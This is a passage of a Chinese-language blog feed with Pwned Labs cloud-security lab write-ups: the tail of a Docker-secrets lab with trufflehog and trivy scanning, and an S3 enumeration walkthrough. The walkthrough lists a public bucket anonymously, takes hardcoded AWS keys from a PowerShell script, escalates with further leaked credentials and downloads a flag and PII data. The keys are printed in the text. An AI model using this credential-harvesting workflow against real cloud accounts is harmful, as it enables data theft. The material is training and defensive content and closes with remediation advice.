class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="6-7-提权以访问敏感数据"><a href="#6-7-提权以访问敏感数据" class="headerlink" title="6.7 提权以访问敏感数据"></a>6.7 提权以访问敏感数据</h3><p>我们可以使用新获得的密钥配置 AWS CLI，完成身份切换，此时我们拥有的是<strong>代码管理员权限</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity <br></code></pre></td></tr></table></figure><p><img src="/image/image_X1eVUOyEns.png"></p><p>最后一步，列出<code>vessel-tracking</code>存储桶中的文件，并读取其中的 flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> vessel-tracking<br>aws s3 <span class="hljs-built_in">cp</span> s3://vessel-tracking/flag.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_GmLI9tBKYQ.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>无论是作为攻击者、防御者还是 DevOps 专业人员，主动发现可能被添加到资源中的 secret 都是一个很好的做法。我们可以使用 <a href="https://github.com/trufflesecurity/trufflehog/" title="Trufflehog">Trufflehog</a> 工具扫描 Docker 容器中是否存在敏感信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog docker --image hljose/huge-logistics-terraform-runner:0.12<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_2TPqnPP2h4.png"></p><p>此外，我们还可以使用 trivy 扫描镜像中的漏洞、错误配置、secret 和 许可证（trivy 默认只扫描漏洞和 secret，因此推荐使用 <code>--scanners</code> 指定所有的扫描类型）。</p><p><img src="/image/image_IchtDm0lu3.png"></p><p>如图所示，该漏洞包含 135 个漏洞。</p><p><img src="/image/image_lDdoOEf49C.png"></p><p>trivy 还可以从 <code>Env</code> 和 <code>History</code> 中扫描出 secret，比 trufflehog 强的是，trivy 可以扫描出 Secret Access Key（当然，这其中还需要去重）。</p><p><img src="/image/image_1RCAaxaMHp.png"></p><p>此外，Trivy 还可以扫描软件包中的许可证，可以帮我们避免一些合规方面的风险，十分推荐。</p><p><img src="/image/image_nqUs0EdNHS.png"></p><p>最后，我们还可以使用 AWS Labs 团队提供的<a href="https://github.com/awslabs/git-secrets" title="git-secrets ">git-secrets</a>工具，以防止密码和其他敏感信息被提交到 Git 仓库中。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWS S3 Enumeration Basics：AWS S3 枚举基础知识</title>
    <link href="/2025/05/01/%E3%80%90Pwned-Labs%E3%80%91AWS-S3-Enumeration-Basics%EF%BC%9AAWS-S3-%E6%9E%9A%E4%B8%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2025/05/01/%E3%80%90Pwned-Labs%E3%80%91AWS-S3-Enumeration-Basics%EF%BC%9AAWS-S3-%E6%9E%9A%E4%B8%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-场景介绍"><a href="#0x00-场景介绍" class="headerlink" title="0x00 场景介绍"></a>0x00 场景介绍</h2><p>这是你作为红队成员的第一天，你的任务是检查一个在被钓鱼员工的书签中发现的网站。</p><p>去看看它会引导你到哪里！范围包括该公司的基础设施，包括云服务。</p><blockquote><p><strong>🎯 点击【阅读原文】，立即进入靶场环境！</strong></p></blockquote><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><ul><li>基本的 Linux 命令行知识</li></ul><h2 id="0x02-学习目标"><a href="#0x02-学习目标" class="headerlink" title="0x02 学习目标"></a>0x02 学习目标</h2><ul><li>熟悉 AWS CLI（命令行界面）</li><li>基础的 S3 枚举和凭证窃取</li><li>了解如何防范此类场景</li></ul><h2 id="0x03-难度等级"><a href="#0x03-难度等级" class="headerlink" title="0x03 难度等级"></a>0x03 难度等级</h2><ul><li>初级（Beginner）</li></ul><h2 id="0x04-关注重点"><a href="#0x04-关注重点" class="headerlink" title="0x04 关注重点"></a>0x04 关注重点</h2><ul><li>红队（Red）</li></ul><h2 id="0x05-真实背景"><a href="#0x05-真实背景" class="headerlink" title="0x05 真实背景"></a>0x05 真实背景</h2><p>Amazon S3（简单存储服务）是一个非常流行的 AWS 服务（也是第二古老的服务），用于存储文件和备份，甚至可以用来托管网站。</p><p>这种多功能性让一些人认为，如果将其分为公有网站托管和私有文件存储两个独立服务，可能会更安全。</p><p>近年来，AWS 在用户设置存储桶为“全网可读”时，引入了更多的可视化警告，但只要这个选项还在，就总有人会使用它！多年来，S3 的配置错误和权限过宽已经导致了许多数据泄露事件。</p><h2 id="0x06-解题思路"><a href="#0x06-解题思路" class="headerlink" title="0x06 解题思路"></a>0x06 解题思路</h2><h3 id="6-1-初步分析"><a href="#6-1-初步分析" class="headerlink" title="6.1 初步分析"></a>6.1 初步分析</h3><p>打开题目所提供的网站进行检查，从安全的角度来说，并未发现什么特别的地方。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://dev.huge-logistics.com<br></code></pre></td></tr></table></figure><p><img src="/image/image_I23P_msSDm.png"></p><p>检查一下网站的源码。这时，我们发现网站的图片、CSS 和 Java Script 等静态文件都被存储在一个名为<code>dev.huge-logistics.com</code> 的 S3 存储桶中。</p><p><img src="/image/image_hmGWMUYG7h.png"></p><p>S3 存储桶是亚马逊简单存储服务（Amazon’s <strong>S</strong>imple <strong>S</strong>torage <strong>S</strong>ervice）上的存储容器，我们可以将文件和图片等数据存储于其中。我们可以将其理解为计算机上的文件夹，不同的是它可以在线进行访问，并且可以存储大量的数据。</p><h3 id="6-2-S3-存储桶权限分析"><a href="#6-2-S3-存储桶权限分析" class="headerlink" title="6.2 S3 存储桶权限分析"></a>6.2 S3 存储桶权限分析</h3><p>我们尝试在浏览器中导航到其中一个文件，然后进行目录遍历，看看是否可以列出存储桶中的其它资源。</p><p>当我们访问以下链接时，它会下载一个大小为 0 的文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://s3.amazonaws.com/dev.huge-logistics.com/static/<br></code></pre></td></tr></table></figure><p><img src="/image/image_w5ksXUX4-Z.png"></p><p>访问以下链接时，访问被拒绝：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://s3.amazonaws.com/dev.huge-logistics.com/<br></code></pre></td></tr></table></figure><p><img src="/image/image_gEE7SJxGS8.png"></p><p>默认情况下，AWS CLI 在请求中包含<code>prefix=</code>（空前缀）和<code>delimiter=/</code>，而我们刚刚通过浏览器发送 GET 请求不包含这些参数。所以，若要在浏览器中列出 S3 存储桶的根目录，我们可以在 URL 中添加这些参数，如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://dev.huge-logistics.com.s3.amazonaws.com/?prefix=&amp;delimiter=/<br></code></pre></td></tr></table></figure><p><img src="/image/image_U03HwkAK2I.png"></p><p>拓展一下，前面两个请求都访问失败，这是因为存储桶设置了以下策略，该策略允许所有人（包括匿名用户）对 S3 桶<code>dev.huge-logistics.com</code>执行<code>ListBucket</code>操作，但仅限列出：</p><ul><li>根目录（<code>&quot;&quot;</code>）</li><li><code>shared/</code>目录</li><li><code>static/</code>目录</li></ul><p>并且只显示“目录级别”内容，不会列出深层文件结构。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListBucketRootAndShared&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::dev.huge-logistics.com&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringEquals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                        <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-string">&quot;shared/&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-string">&quot;static/&quot;</span><br>                    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;s3:delimiter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>字段</th><th>含义</th><th>示例值</th><th>说明</th></tr></thead><tbody><tr><td>`Sid`</td><td>语句 ID</td><td>`ListBucketRootAndShared`</td><td>标识该语句，可选字段，主要用于识别策略语句。</td></tr><tr><td>`Effect`</td><td>执行效果</td><td>`Allow`</td><td>表示允许该操作（也可能为`Deny`）。</td></tr><tr><td>`Principal`</td><td>操作的主体</td><td><code>*</code></td><td>表示<strong>所有用户</strong>都可以执行该操作（包含匿名用户）。</td></tr><tr><td>`Action`</td><td>允许的操作</td><td>`s3:ListBucket`</td><td>允许执行列出桶内对象键（文件名）的操作。</td></tr><tr><td>`Resource`</td><td>作用对象</td><td>`arn:aws:s3:::dev.huge-logistics.com`</td><td>指定策略作用的 S3 存储桶（注意：这是桶，不是文件）。</td></tr><tr><td>`Condition`</td><td>条件限制</td><td>如下所示</td><td>只有满足以下子条件时，才能执行操作。</td></tr><tr><td>└─`s3:prefix`</td><td>被列出的前缀路径</td><td>`[“”, “shared&#x2F;“, “static&#x2F;“]`</td><td>只允许列出根目录、`shared&#x2F;`和`static&#x2F;`目录中的对象。</td></tr><tr><td>└─`s3:delimiter`</td><td>分隔符</td><td>`“&#x2F;“`</td><td>将对象按“文件夹”层次结构划分（常用于目录浏览效果）。</td></tr></tbody></table><blockquote><p>很多浏览器默认以纯文本的方式展示 XML 文件，我们可以查看网页源码，获得 XML 的完整结构，这里已经通过 <a href="https://sourceforge.net/projects/xml-viewer-plus/" title="XML Viewer Plus">XML Viewer Plus</a> 插件进行了格式化</p></blockquote><h3 id="6-3-利用-AWS-CLI-获取更多信息"><a href="#6-3-利用-AWS-CLI-获取更多信息" class="headerlink" title="6.3 利用 AWS CLI 获取更多信息"></a>6.3 利用 AWS CLI 获取更多信息</h3><blockquote><p>在基于 Debian 的 Linux 发行版（例如 Ubuntu）上，我们可以通过命令 <code>apt install awscli</code>安装 AWS CLI。对于其他发行版和操作系统，请参阅 AWS<a href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html" title="文档">文档</a>。</p></blockquote><p>现在，我们可以使用 AWS CLI 来检查存储桶了。尝试使用以下命令列出其内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com --no-sign-request<br></code></pre></td></tr></table></figure><p>由于我们安装的 AWS CLI 是 v2 版本，该版本默认情况下会对请求进行签名。所以，我们需要通过<code>--no-sign-request</code> 来发送未签名的请求来测试存储桶的公共访问。如果不指定该标志，那么 AWS CLI 将使用本地配置的 AWS 凭证。</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>aws</td><td>工具的名称</td></tr><tr><td>s3</td><td>与之交互的服务名称，在本例中是 Amazon S3</td></tr><tr><td>ls</td><td>执行的操作，在本例中是列出内容</td></tr><tr><td>URL</td><td>`s3:&#x2F;&#x2F;dev.huge-logistics.com`指的是 S3 存储桶的名称。</td></tr><tr><td>s3:&#x2F;&#x2F;</td><td>列出存储桶时不必指定前缀，但其他操作（如复制文件`cp`）需要此前缀。</td></tr><tr><td>--no-sign-request</td><td>禁止对请求进行签名</td></tr></tbody></table><blockquote><p>AWS CLI v1 默认情况下是不会对请求进行签名的，若之前有通过 aws configure 进行了配置，我们还可以通过 <code>rm -rf ~/.aws</code> 进行删除。</p></blockquote><p>命令已成功执行了，这表明 S3 bucket 已开放，可供整个互联网访问。这在用于存储公网内容的情况下是合理的，但它似乎还包含其他目录……</p><p><img src="/image/image_6yUovGoDsQ.png"></p><p>接下来，我们尝试通过<code>--recursive</code>列出所有的目录，但由于访问被拒绝而失败，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com --no-sign-request --recursive<br></code></pre></td></tr></table></figure><p><img src="/image/image_hOSpgRLrUA.png"></p><p>那么我们就一一列出这些目录吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/admin/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/migration-files/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/shared/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/static/ --no-sign-request<br><br></code></pre></td></tr></table></figure><p>总结一下，<code>admin</code> 目录和 <code>migration</code> 目录不允许访问，<code>static</code> 目录下似乎没有什么有用的信息，可能就只有<code>migration-files</code> 目录有点戏了。</p><p><img src="/image/image_Agsg6Xph6j.png"></p><h3 id="6-4-下载并分析压缩包"><a href="#6-4-下载并分析压缩包" class="headerlink" title="6.4 下载并分析压缩包"></a>6.4 下载并分析压缩包</h3><p>我们先下载下来进行分析。将压缩包进行解压过后，我们发现了一个 PowerShell 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request<br>unzip hl_migration_project.zip -d hl_migration_project<br></code></pre></td></tr></table></figure><p><img src="/image/image_WFbY6aybec.png"></p><p>该脚本包含了硬编码的 AWS 密钥，脚本的目的似乎是获取存储在 XML 文件中的 secret，并将其存储在 AWS Secrets Manager 中。Secrets Manager 是一项服务，可帮助安全地存储、管理和检索 API 密钥和数据库凭证等密钥。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AWS Configuration</span><br><span class="hljs-comment"># AWS 配置</span><br><span class="hljs-variable">$accessKey</span> = <span class="hljs-string">&quot;AKIA3SFMDAPOWOWKXEHU&quot;</span><br><span class="hljs-variable">$secretKey</span> = <span class="hljs-string">&quot;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&quot;</span><br><span class="hljs-variable">$region</span> = <span class="hljs-string">&quot;us-east-1&quot;</span><br><br><span class="hljs-comment"># Set up AWS hardcoded credentials</span><br><span class="hljs-comment"># 设置 AWS 硬编码凭证</span><br><span class="hljs-built_in">Set-AWSCredentials</span> <span class="hljs-literal">-AccessKey</span> <span class="hljs-variable">$accessKey</span> <span class="hljs-literal">-SecretKey</span> <span class="hljs-variable">$secretKey</span><br><br><span class="hljs-comment"># Set the AWS region</span><br><span class="hljs-comment"># 设置 AWS 区域</span><br><span class="hljs-built_in">Set-DefaultAWSRegion</span> <span class="hljs-literal">-Region</span> <span class="hljs-variable">$region</span><br><br><span class="hljs-comment"># Read the secrets from export.xml</span><br><span class="hljs-comment"># 从 export.xml 中读取 secret</span><br>[<span class="hljs-built_in">xml</span>]<span class="hljs-variable">$xmlContent</span> = <span class="hljs-built_in">Get-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;export.xml&quot;</span><br><br><span class="hljs-comment"># Output log file</span><br><span class="hljs-comment"># 输出日志文件</span><br><span class="hljs-variable">$logFile</span> = <span class="hljs-string">&quot;upload_log.txt&quot;</span><br><br><span class="hljs-comment"># Error handling with retry logic</span><br><span class="hljs-comment"># 使用重试逻辑进行错误处理</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">TryUploadSecret</span><span class="hljs-params">(<span class="hljs-variable">$secretName</span>, <span class="hljs-variable">$secretValue</span>)</span></span> &#123;<br>    <span class="hljs-variable">$retries</span> = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$retries</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-built_in">New-SECSecret</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$secretName</span> <span class="hljs-literal">-SecretString</span> <span class="hljs-variable">$secretValue</span><br>            <span class="hljs-variable">$logEntry</span> = <span class="hljs-string">&quot;Successfully uploaded secret: <span class="hljs-variable">$secretName</span> with ARN: <span class="hljs-variable">$</span>(<span class="hljs-variable">$result</span>.ARN)&quot;</span><br>            <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$logEntry</span><br>            <span class="hljs-built_in">Add-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$logFile</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$logEntry</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$true</span><br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            <span class="hljs-variable">$retries</span><span class="hljs-literal">--</span><br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed attempt to upload secret: <span class="hljs-variable">$secretName</span>. Retries left: <span class="hljs-variable">$retries</span>. Error: <span class="hljs-variable">$_</span>&quot;</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$false</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$secretNode</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$xmlContent</span>.Secrets.Secret) &#123;<br>    <span class="hljs-comment"># Implementing concurrency using jobs</span><br>    <span class="hljs-comment"># 使用作业实现并发</span><br>    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<br>        <span class="hljs-keyword">param</span>(<span class="hljs-variable">$secretName</span>, <span class="hljs-variable">$secretValue</span>)<br>        TryUploadSecret <span class="hljs-literal">-secretName</span> <span class="hljs-variable">$secretName</span> <span class="hljs-literal">-secretValue</span> <span class="hljs-variable">$secretValue</span><br>    &#125; <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$secretNode</span>.Name, <span class="hljs-variable">$secretNode</span>.Value<br>&#125;<br><br><span class="hljs-comment"># Wait for all jobs to finish</span><br><span class="hljs-comment"># 等待所有作业完成</span><br><span class="hljs-variable">$jobs</span> = <span class="hljs-built_in">Get-Job</span><br><span class="hljs-variable">$jobs</span> | <span class="hljs-built_in">Wait-Job</span><br><br><span class="hljs-comment"># Retrieve and display job results</span><br><span class="hljs-comment"># 获取并显示作业结果</span><br><span class="hljs-variable">$jobs</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-built_in">Receive-Job</span> <span class="hljs-literal">-Job</span> <span class="hljs-variable">$_</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> <span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed to upload secret: <span class="hljs-variable">$</span>(<span class="hljs-variable">$_</span>.Name) after multiple retries.&quot;</span><br>    &#125;<br>    <span class="hljs-comment"># Clean up the job</span><br>    <span class="hljs-comment"># 清理作业</span><br>    <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Job</span> <span class="hljs-variable">$_</span><br>&#125;<br><br><span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;Batch upload complete!&quot;</span><br><br><br><span class="hljs-comment"># Install-Module -Name AWSPowerShell -Scope CurrentUser -Force</span><br><span class="hljs-comment"># 安装模块 -Name AWSPowerShell -Scope CurrentUser -Force</span><br><span class="hljs-comment"># .\migrate_secrets.ps1%                                                                                                                            </span><br></code></pre></td></tr></table></figure><p>除了 access key 和 secret key 之外，我们还可以从脚本中看到 region 为<code>us-east-1</code>。对于攻击者而言，在设置密钥时，了解使用的是哪个区域是非常有用的。当然，我们仍然可以通过以下命令，从 S3 存储桶中获取更多的线索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -I https://s3.amazonaws.com/dev.huge-logistics.com/<br></code></pre></td></tr></table></figure><p>该命令仅返回请求头，这进一步表明存储桶是在<code>us-east-1</code>区域中创建的。</p><p><img src="/image/image_kln-iPRzUN.png"></p><h3 id="6-5-利用泄露的-AWS-密钥提升权限"><a href="#6-5-利用泄露的-AWS-密钥提升权限" class="headerlink" title="6.5 利用泄露的 AWS 密钥提升权限"></a>6.5 利用泄露的 AWS 密钥提升权限</h3><p>接下来，我们就可以通过下面的命令设置 AWS CLI 的密钥了，其中 access key 相当于用户名，secret key 相当于密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br></code></pre></td></tr></table></figure><p><img src="/image/image_P-PBlPXpIB.png"></p><p>我们不需要像在 Linux 和 Windows 上那样运行<code>whoami</code>，而是通过以下命令，再次验证我们的身份。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure><p>命令显示我们的用户名<code>pam-test</code>，再根据脚本的性质，我们可以假设 pam 代表特权访问管理 (Privilege Access Management)。</p><p><img src="/image/image_LEqyQ34_va.png"></p><p>因此，我们再尝试列出刚刚无法访问的目录。这里，需要注意的是，我们现在已经拥有有效的 AWS 凭证了，可以删除<code>--no-sign-request</code> 标志，使用我们刚刚设置的密钥对请求进行签名了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/admin/<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/migration-files/<br><br></code></pre></td></tr></table></figure><p>除了一些常规的资料文件之外，我们看到了 flag 文件、power shell 文件以及 xml 文件。</p><p><img src="/image/image_5s4pvDgS7j.png"></p><p>我们先将它们下载到本地，再进行分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/flag.txt .<br>aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/migration-files/migrate_secrets.ps1 .<br>aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/migration-files/test-export.xml .<br><br></code></pre></td></tr></table></figure><p>但当前的 AWS 凭证无法下载 flag 文件。我们只能从其它的两个文件中找到线索了。</p><p><img src="/image/image_MrxTMO2kWK.png"></p><h3 id="6-6-利用泄露的-AWS-密钥再次提权"><a href="#6-6-利用泄露的-AWS-密钥再次提权" class="headerlink" title="6.6 利用泄露的 AWS 密钥再次提权"></a>6.6 利用泄露的 AWS 密钥再次提权</h3><p>查看<code>test-export.xml</code> 文件，我们发现了新的 AWS 凭证。</p><p><img src="/image/image_RDEz00s8CY.png"></p><p>我们使用新的凭证配置 AWS CLI，现在我们是 <code>it-admin</code> 用户了。</p><p><img src="/image/image_u5Ukgxr7W8.png"></p><h3 id="6-7-成功获取-Flag-和敏感信息"><a href="#6-7-成功获取-Flag-和敏感信息" class="headerlink" title="6.7 成功获取 Flag 和敏感信息"></a>6.7 成功获取 Flag 和敏感信息</h3><p>我们需要做的第一件事情便是下载 <code>flag.txt</code> 文件，获取 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/flag.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_oJymloxgwo.png"></p><p>此外，管理员账户<code>it-admin</code>还能访问管理员文件夹，里面竟然有用户信用卡号和其他 PII（个人身份信息）的明文信息！于是该网站被攻陷了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/website_transactions_export.csv .<br></code></pre></td></tr></table></figure><p><img src="/image/image_GGGxLwDzGG.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>该数据泄露的根本原因是存储桶的错误配置和存储敏感文件的管理失误。为了避免类似情况发生，应加强存储桶的权限管理、避免硬编码凭证、提高敏感数据的保护级别，采用更安全的文件共享和加密方法。</p><ol><li>S3 存储桶使用不当<ul><li>问题：S3 存储桶被用于托管静态网站文件和存储敏感文件。</li><li>建议：存储桶应分开使用。托管静态网站文件的存储桶不应存储敏感文件，应为敏感文件使用独立存储桶。</li></ul></li><li><code>shared</code>目录的权限设置问题<ul><li>问题：<code>shared</code>目录设置为全网可读，可能是为了与外部承包商或顾问共享迁移脚本。</li><li>风险：即使是短时间内共享敏感文件，也可能带来巨大风险，因为脚本和机器人能够自动检测变化并下载文件。</li><li>建议：通过更安全的方式共享文件，并用强随机密码加密压缩文件，确保文件的安全。</li></ul></li><li>AWS 凭证硬编码问题<ul><li>问题：AWS 凭证被硬编码到 PowerShell 脚本中。</li><li>风险：任何人都可以访问这些凭证，从而进入云环境，导致账户被恶意使用。</li><li>建议：避免在代码中硬编码凭证，改用更安全的凭证管理方式，例如 IAM 角色或环境变量。</li></ul></li><li>PAM 系统导出文件暴露问题<ul><li>问题：一个从安全 PAM 系统导出的 XML 文件被存储在 S3 存储桶中，并且可以被第一个被攻击的 IAM 账户访问。</li><li>风险：该文件包含高权限凭证，泄露了 Huge Logistics 